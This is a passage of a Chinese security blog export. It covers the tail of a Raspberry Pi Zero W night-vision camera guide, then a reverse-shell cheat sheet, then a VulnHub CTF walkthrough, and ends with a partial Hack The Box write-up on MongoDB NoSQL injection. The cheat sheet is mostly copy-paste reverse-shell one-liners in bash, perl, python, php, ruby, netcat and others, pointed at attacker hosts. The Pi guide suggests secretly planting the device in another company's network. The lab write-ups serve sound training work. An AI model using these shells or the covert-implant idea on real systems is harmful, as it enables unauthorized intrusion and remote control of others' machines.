<p>即可在网页端开始夜视监控操作！</p>
<h3 id="STEP6-用手机随时随地来控制摄像头，打造移动夜视摄影"><a href="#STEP6-用手机随时随地来控制摄像头，打造移动夜视摄影" class="headerlink" title="STEP6.用手机随时随地来控制摄像头，打造移动夜视摄影:"></a><strong><em>STEP6.</em></strong>用手机随时随地来控制摄像头，打造移动夜视摄影:</h3><p>首先要让pi zero w支持vnc远程登陆，运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install tightvncserver</span><br></pre></td></tr></table></figure>

<p>然后输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tightvncserver</span><br></pre></td></tr></table></figure>
<p>这时根据提示输入密码两次，远程登录桌面的密码，待会儿连接时需要输入这个密码才能连接成功。</p>
<p>最后输出一大段话，只看最后，是一个数字.log，第一次应该是1.log，这时就可以远程桌面连接了（桌面系统启动需要一点时间，这时马上连接的话能连接成功，但是没有图像，等待半分钟左右出现图像）。</p>
<p>Windows下使用VNC-Viewer软件，输入IP：刚才log前面的数字，这里就是你的树莓派的IP:1了，IP可以用ifconfig命令查看，然后输入密码。 </p>
<p>登陆成功，接着连接手机热点的wifi，以便树莓派每次开机自启时，都连接到自己手机的热点。</p>
<p><img src="/images/pi21.jpg" alt="手机"></p>
<p>然后输入poweroff，关机，拔出usb数据线。</p>
<h3 id="STEP7-连接上充电宝，开始用手机远程控制，并监控"><a href="#STEP7-连接上充电宝，开始用手机远程控制，并监控" class="headerlink" title="STEP7.连接上充电宝，开始用手机远程控制，并监控:"></a><strong><em>STEP7.</em></strong>连接上充电宝，开始用手机远程控制，并监控:</h3><p>按下图所示连接充电宝，上电（其实只要有供电源就行）</p>
<p><img src="/images/pi25.jpg" alt="手机"></p>
<p>开启手机热点并等待几分钟后，pi zero w会自动连接上热点，然后照下图所示设置ssh</p>
<p><img src="/images/pi26.jpg" alt="手机"></p>
<p><img src="/images/pi27.jpg" alt="手机"></p>
<p>在前面几个步骤中记下wlan0的ip地址以便连接ssh，如下图成功连接ssh，并执行来开启摄像头的命令</p>
<p><img src="/images/pi28.jpg" alt="手机"></p>
<p><img src="/images/pi29.jpg" alt="手机"></p>
<p>看下面几张图，用手机成功远程控制摄像头，并且可以夜视，非常强悍！</p>
<p><img src="/images/pi30.jpg" alt="手机"></p>
<p><img src="/images/pi31.jpg" alt="手机"></p>
<p><img src="/images/pi32.jpg" alt="手机"></p>
<p>下面是手机端vnc viewer连接树莓派的效果图，如果将pi zero w偷偷安装在别人公司里，并连接上公司的内网，再设置下端口映射，就可以通过外网来访问安放在公司内网的pi zero w了！（有什么用自己脑补）</p>
<p><img src="/images/pi33.jpg" alt="手机"></p>
<h4 id="更多有关于pi-zero-w的用法，请关注本人的博客，你本人会不定时更新更多内容！谢谢浏览！"><a href="#更多有关于pi-zero-w的用法，请关注本人的博客，你本人会不定时更新更多内容！谢谢浏览！" class="headerlink" title="更多有关于pi zero w的用法，请关注本人的博客，你本人会不定时更新更多内容！谢谢浏览！"></a><font color="red"><strong><em>更多有关于pi zero w的用法，请关注本人的博客，你本人会不定时更新更多内容！谢谢浏览！</em></strong></h4>]]></content>
      <categories>
        <category>制作</category>
      </categories>
      <tags>
        <tag>raspberrypi zero w</tag>
        <tag>智能硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse shell 大全</title>
    <url>/2020/01/20/reverse-shell/</url>
    <content><![CDATA[<p>如果您很幸运在渗透测试期间发现了命令执行漏洞，那么不久之后您可能会需要一个交互式shell。</p>
<p>如果无法添加新帐户/SSH密钥/.rhosts文件并仅登录，则下一步可能是使用reverse shell或将shell绑定到TCP端口。此页面涉及前者。创建reverse shell程序的选项受目标系统上安装的脚本语言的限制-尽管如果准备充分，也可以上传二进制程序。显示的示例是针对类Unix系统量身定制的。如果将“/bin/sh -i”替换为“cmd.exe”，则以下某些示例在Windows上也应适用。</p>
<p>下面的每种方法都旨在成为一种可以复制/粘贴的方式。因此，它们的行很短，但可读性很差。</p>
<a id="more"></a>

<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><ul>
<li>某些版本的bash可以向您发送reverse shell（已在Ubuntu 10.10上进行了测试）：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<ul>
<li>Bash shell的替代品：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> /bin/bash 0&amp;0 2&gt;&amp;0</span><br><span class="line"></span><br><span class="line">Or:</span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">Or:</span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/attackerip/4444</span><br><span class="line">cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span>  </span><br><span class="line">or:</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<ul>
<li>现在，本地侦听服务器中键入的所有内容都将在目标上执行，并且命令的输出将通过管道返回。请记住，我们不在目标上使用任何第三方工具，而是在其默认shell程序上使用。该技术在许多情况下都很方便，并且在目标系统上只占很小的空间。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc -l -p 8080 -vvv</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/evil.com/8080</span><br><span class="line">$ cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<ul>
<li>端口扫描：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 79 80 81; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span> &amp; bash -i &gt;&amp; /dev/tcp/192.168.1.1/<span class="variable">$i</span> 0&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<ul>
<li>禁用了GAPING_SECURITY_HOLE的netcat：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc 192.168.56.11 8888 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<ul>
<li>没有netcat的netcat：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/192.168.56.110/8080 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<ul>
<li>没有netcat或/dev/tcp的netcat：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 192.168.56.114 2336 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>

<ul>
<li>telnet-to-telnet:<br>我不确定为什么要使用这种技术，但这是一个选择，因此仍然可以使用。这显然是最丑陋的技术。此技术使用连接到远程侦听器的两个telnet会话，将输入从一个telnet会话传递到/bin/bash，然后将输出传递到第二个telnet会话。命令输入到攻击者侦听器中的一个侦听器中，并且在另一个侦听器上接收反馈。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash | telnet 192.168.56.110 8899</span><br></pre></td></tr></table></figure>

<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><ul>
<li>这是perl-reverse-shell的简短，无功能版本：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>不依赖/bin/sh的较短的Perl反向shell：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果目标系统正在运行Windows，请使用以下单行代码：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -MIO -e <span class="string">&#x27;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><ul>
<li>这已在Linux/Python 2.7下进行了测试：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><ul>
<li>该代码假定TCP连接使用文件描述符3.在我的测试系统上有效。如果不起作用，请尝试4、5、6…</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
<p>如果要上传.php文件，请参见功能更强大的php-reverse-shell。</p>
<h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>不依赖/bin/sh的更长的Ruby反向shell：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>如果目标系统正在运行Windows，请使用以下单行代码：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><ul>
<li>Netcat在生产系统上很少出现，即使有多个版本的Netcat，其中一些也不支持-e选项。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br></pre></td></tr></table></figure>

<ul>
<li>如果您安装了错误的netcat版本，Jeff Price在这里指出，您仍然可以像下面这样获得reverse shell：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<ul>
<li>其他可能的Netcat reverse Shell，取决于Netcat版本和编译标志：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -c /bin/sh attackerip 4444</span><br><span class="line">Or:</span><br><span class="line">/bin/sh | nc attackerip 4444</span><br><span class="line">Or:</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure>

<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h3 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h3><ul>
<li>reverse shell的最简单形式之一是xterm会话。以下命令应在服务器上运行。它将尝试通过TCP端口6001重新连接到您（10.0.0.1）。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xterm -display 10.0.0.1:1</span><br><span class="line">Or:</span><br><span class="line">$ DISPLAY=attackerip:0 xterm</span><br></pre></td></tr></table></figure>

<ul>
<li>要捕获传入的xterm，请启动X服务器（：1 –侦听TCP端口6001）。一种方法是使用Xnest（在您的系统上运行）：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Xnest :1</span><br></pre></td></tr></table></figure>

<ul>
<li>您需要授权目标连接到您（命令也在主机上运行）：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xhost +targetip</span><br></pre></td></tr></table></figure>

<h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><ul>
<li>当然，您也可以使用Telnet替代Netcat：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p</span><br><span class="line">Or:</span><br><span class="line">telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   <span class="comment"># Remember to listen on your machine also on port 4445/tcp</span></span><br></pre></td></tr></table></figure>

<h3 id="RCE-shell"><a href="#RCE-shell" class="headerlink" title="RCE shell"></a>RCE shell</h3><ul>
<li>这个有点作弊。这仅适用于远程命令执行漏洞。编写了一个小的python脚本，而不是将命令手动输入到代理或浏览器url中，从而为您提供了shell的感觉，而没有产生任何与目标相反的内容。您只需向脚本传递易受攻击的url，并将可注入字段替换为’<rce>‘标记，即可为您提供一个干净的界面来输入命令。在后台，脚本将请求发送到Web服务器，解析响应并将其呈现给您。</li>
</ul>
<p><img src="https://www.lanmaster53.com/static/images/posts/sh_rce.png"></p>
<h3 id="通过交互式控制台的PHP-reverse-Shell"><a href="#通过交互式控制台的PHP-reverse-Shell" class="headerlink" title="通过交互式控制台的PHP-reverse-Shell"></a>通过交互式控制台的PHP-reverse-Shell</h3><ul>
<li>最后一种技术是利用php交互式控制台。攻击者发出一个命令，该命令移至/tmp目录（因为它通常在world范围内可写），使用wget下载恶意php-reverse-tcp后门（攻击者将其托管在他控制的Web服务器上），然后通过交互式控制台。</li>
</ul>
<p><img src="https://www.lanmaster53.com/static/images/posts/sh_php.png"></p>
]]></content>
      <categories>
        <category>reverse shell</category>
      </categories>
      <tags>
        <tag>reverse shell</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[JIS-CTF-VulnUpload]</title>
    <url>/2019/12/07/vulnhub-JIS-CTF-VulnUpload/</url>
    <content><![CDATA[<p>i春秋平台的ctf题目已经被我做的差不多了，最近实在是手痒，又在网上搜了搜练习靶场，发现其它ctf平台的题目都不如i春秋，然后我看到有很多网友在玩vulnhub靶场，然后我从网上了解了下vulnhub，确实不错，类似于ctf，难度也可以，每个靶场有多个flag，<span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20v">vulnhub官网<i class="fa fa-external-link-alt"></i></span></p>
<p>vulnhub每隔一段时间就会更新新的靶机，到现在其官网上可供下载的靶机已经有380个左右了，</p>
<a id="more"></a>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub1.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub2.jpg"></p>
<p>本人索性把380个左右的靶机全部下载下来了。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/exiting.jpg"></p>
<p>下面开始记录靶机的walkthrough</p>
<h4 id="JIS-CTF-VulnUpload"><a href="#JIS-CTF-VulnUpload" class="headerlink" title="JIS-CTF: VulnUpload"></a>JIS-CTF: VulnUpload</h4><p>官网下载:</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5tZWRpYWZpcmUuY29tL2ZpbGUvdDViNG5reW54a205aGoyL0NURjAxLm92YQ==">http://www.mediafire.com/file/t5b4nkynxkm9hj2/CTF01.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9qaXNjdGYvSklTLUNURi1WdWxuVXBsb2FkLUNURjAxLm92YQ==">https://download.vulnhub.com/jisctf/JIS-CTF-VulnUpload-CTF01.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9qaXNjdGYvSklTLUNURi1WdWxuVXBsb2FkLUNURjAxLm92YS50b3JyZW50">https://download.vulnhub.com/jisctf/JIS-CTF-VulnUpload-CTF01.ova.torrent <i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述:</p>
<ul>
<li>难度: 初学者</li>
<li>说明: 这台机器上有五个标志。 尝试找到它们。 查找所有标志平均需要1.5个小时</li>
<li>仅与VirtualBox一起使用</li>
</ul>
<h3 id="VMware网络配置"><a href="#VMware网络配置" class="headerlink" title="VMware网络配置"></a>VMware网络配置</h3><p>下面详细说明在vmware上的配置方法</p>
<p>靶机的账号口令为： technawi/3vilH@ksor<br>vmware打开虚拟机后登录然后更改root用户的密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
<p>然后输入密码3vilH@ksor，根据提示重置root用户的密码，进入超级用户后，执行下面命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ifconfig ens33 up //启用网卡，然后再通过 ifconfig -a 看，发现 没有IP</span><br><span class="line"></span><br><span class="line">dhclient ens33  // 分配IP</span><br></pre></td></tr></table></figure>
<p>即可成功获取ip，记住，靶机和kali linux的vmware的网络都要设置为[自定义：特定虚拟网络的&lt;VMnet8(NAT模式)&gt;]</p>
<h3 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h3><p>主机发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn -v 192.168.84.0/24</span><br></pre></td></tr></table></figure>
<p>发现靶机的ip地址:192.168.84.136</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub3.jpg"></p>
<p>进一步扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -v -sS -Pn -T4 --script=vuln 192.168.84.136</span><br></pre></td></tr></table></figure>
<p>得到如下信息</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub4.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub5.jpg"></p>
<ul>
<li>flag1:</li>
</ul>
<p>打开robots.txt中的flag</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub6.jpg"></p>
<ul>
<li>flag2:</li>
</ul>
<p>地址栏输入<span class="exturl" data-url="aHR0cDovL2lwL2FkbWluX2FyZWEvLCVFNSU4RiVCMyVFOSU5NCVBRSVFNiU5RiVBNSVFNyU5QyU4QiVFNiVCQSU5MCVFNyVBMCU4MSVFNSVCRSU5NyVFNSU4OCVCMCVFNyVBQyVBQyVFNCVCQSU4QyVFNCVCOCVBQWZsYWc=">http://ip/admin_area/,右键查看源码得到第二个flag<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub7.jpg"></p>
<ul>
<li>flag3:</li>
</ul>
<p>从刚才第二个flag的地方得到管理员的账号密码，地址栏打开<span class="exturl" data-url="aHR0cDovL2lwL2xvZ2luLnBocCVFNyU5OSVCQiVFNSVCRCU5NQ==">http://ip/login.php登录<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub8.jpg"></p>
<p>直接上冰蝎</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub9.jpg"></p>
<p>翻到/var/www/html/目录下面，看到一个hint.txt和flag.txt,flag.txt我们apache的组是无法进行然后操作的，但是hint.txt可以读取，</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub10.jpg"></p>
<ul>
<li>flag4:</li>
</ul>
<p>第三个flag提示用technawi用去读取flag.txt文件，可以在隐藏文件中找到用户的信息</p>
<p>启动shell的命令行模式，输入命令find / -user ‘technawi’ 2&gt;/dev/null, 2&gt;/dev/null是过滤掉类似没有权限的信息</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub11.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub12.jpg"></p>
<ul>
<li>flag5:</li>
</ul>
<p>按照第四个flag的提示，用里面的账号密码去登录靶机ssh</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub13.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[mango]</title>
    <url>/2020/04/20/mango/</url>
    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>操作系统：Linux<br>难度：中等<br>点数：30<br>发行：2019年10月26日<br>IP：10.10.10.162</p>
<p>user一血用时：04小时28分58秒。<br>root一血用时：05小时14分45秒。</p>
<p>看来是真特么的耗时间</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb14.jpg"></li>
<li><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></li>
</ul>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p- --min-rate=1000 -T4 -v -sV 10.10.10.162</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p 22,80,443 -A -v 10.10.10.162</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)</span><br><span class="line">|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)</span><br><span class="line">|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Mango | Search Base</span><br><span class="line">| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN</span><br><span class="line">| Issuer: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2019-09-27T14:21:19</span><br><span class="line">| Not valid after:  2020-09-26T14:21:19</span><br><span class="line">| MD5:   b797 d14d 485f eac3 5cc6 2fed bb7a 2ce6</span><br><span class="line">|_SHA-1: b329 9eca 2892 af1b 5895 053b f30e 861f 1c03 db95</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br></pre></td></tr></table></figure>

<p>Nmap扫描显示运行其通常服务的端口22、80和443。此外，Nmap还发现了一个名为stage -order.mango的vhost。在SSL证书中提到的htb。添加mango.htb和staging-order.mango.htb到/etc/hosts，然后继续枚举。</p>
<p>浏览到端口80将返回一个403禁止错误，然而，HTTPS网站显示了一个搜索引擎。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb15.jpg"></li>
</ul>
<p>页面只是刷新，搜索时不返回任何结果。第二个vhost在HTTPS上托管返回相同的页面。然而，HTTP网站却只是显示了一个登录页面。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb16.jpg"></li>
</ul>
<p>尝试使用通用默认凭据登录失败。在Burp中拦截请求并检查登录请求。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb17.jpg"></li>
</ul>
<p>注入引号没有返回错误或改变响应。由于网站正在运行PHP，可以尝试使用类型杂耍绕过身份验证。<br>这可以通过向请求参数添加[]来实现，这使得PHP将它们作为数组使用。如果存在任何弱比较，则将绕过身份验证。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb18.jpg"></li>
</ul>
<p>会导致失败的尝试。尝试一下NoSQL注入攻击，比如MongoDB身份验证绕过。MongoDB使用$ne (not equal)操作符来比较值。这个操作符可以通过数组语法传递给PHP，它最终会被注入到MongoDB查询中。</p>
<p>这是一个例子MongoDB查询找到一个用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123; username: <span class="string">&quot;admin&quot;</span>, password: <span class="string">&quot;admin&quot;</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>上面的查询将导致由于密码错误而导致登录失败。发送参数password[$ne]=admin的请求将导致查询:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">db.users.find(&#123; username: <span class="string">&quot;admin&quot;</span>, password: &#123; <span class="variable">$ne</span> : <span class="string">&quot;admin&quot;</span> &#125; &#125;);</span><br></pre></td></tr></table></figure>

<p>这将返回true，因为admin的密码不等于admin，会成功地绕过登录。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb19.jpg"></li>
</ul>
<p>$ne的注入被发现是成功的，并且页面将重定向到home.php作为admin。使用登录请求重复相同的过程将返回以下页面。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb20.jpg"></li>
</ul>
<h3 id="MongoDB注入"><a href="#MongoDB注入" class="headerlink" title="MongoDB注入"></a>MongoDB注入</h3><p>因为主页没有返回任何有用的信息。可以尝试使用$regex操作符从Mongo数据库中提取数据。$regex操作符可用于使用正则表达式查找数据。</p>
<p>例如，下面的查询将搜索匹配</p>
<p>regex a.*</p>
<p>的用户名，匹配任何包含a的用户名。</p>
